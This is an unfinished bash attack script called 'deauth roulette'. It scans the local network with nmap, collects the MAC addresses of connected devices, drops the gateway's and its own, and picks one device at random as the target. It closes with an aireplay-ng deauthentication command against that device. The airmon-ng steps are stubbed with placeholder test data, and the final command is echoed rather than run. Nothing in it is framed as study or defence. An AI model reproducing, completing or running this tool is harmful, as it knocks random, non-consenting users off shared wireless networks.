#!/bin/bash
# Welcome to deauth roulette

# Check for nmap
if ! [ -x "$(command -v nmap)" ]; then
  echo 'Warning: nmap is not installed. Switching to Windows mode.' >&2
  # For Windows
  nmap="/mnt/c/Program Files (x86)/Nmap/nmap.exe"
else
  nmap=$(which nmap)
fi

# Check for aircrack-ng
if ! [ -x "$(command -v aircrack-ng)" ]; then
  echo 'Error: aircrack-ng is not installed.' >&2
  exit 1
fi

# Get wireless interface
# rawAirmon=$(sudo airmon-ng)
# test data for windows
rawAirmon="
basd asdfs asdf2w3t 2352626 1113
wlan0 asdfsd asdfadsf asdfadf asdsdfa
wlan1 asdfs wet23 2626 basdgad
";
wirelessCard=$(printf "$rawAirmon" | grep "wlan" | head -1 | grep -o "^wlan[0-9]\+");
echo "$wirelessCard";

# Get your own mac address (to whitelist from potential targets)
myMac=$(ip addr show "$wirelessCard" | grep "ether" | grep -oi '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}');

# Configure wireless card to monitor mode
# monitor=$(sudo airmon-ng start "$wirelessCard" | grep -o "^mon[0-9]\+");
# test data for windows
monitor="mon0";
echo "$monitor";

# Get the gateway ip
gateway=$(ip r | grep default | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])');

# Get gateway mac addreess
gatewayMac=$("${nmap}" "${gateway}" | grep "MAC" | grep -oi '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}');

echo "Gateway IP:"
echo "$gateway";
echo "Gateway MAC:"
echo "$gatewayMac";

# Get all connected mac addresses
echo "Other MACS:"
macs=$("${nmap}" "${gateway}/24" | grep "MAC" | grep -oi '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}' | tr '\r\n' ' ')
# remove gateway mac
macs=${macs//$gatewayMac};
# remove your own mac
macs=${macs//$myMac};

# Select random mac to target
IFS=' ' read -r -a array <<< "$macs"
for index in "${!array[@]}"
do
  echo "${array[index]}"
done
length="${#array[@]}"
targetIndex=$(($RANDOM%$length));
targetMac=${array[targetIndex]};

echo "TARGET:";
echo "$targetMac";

# Deauth the target!
# we can't do this on a windows shell... test it later on Kali
echo 'aireplay-ng -0 1 -a "$gatewayMac" -c "$targetMac" "$monitor"'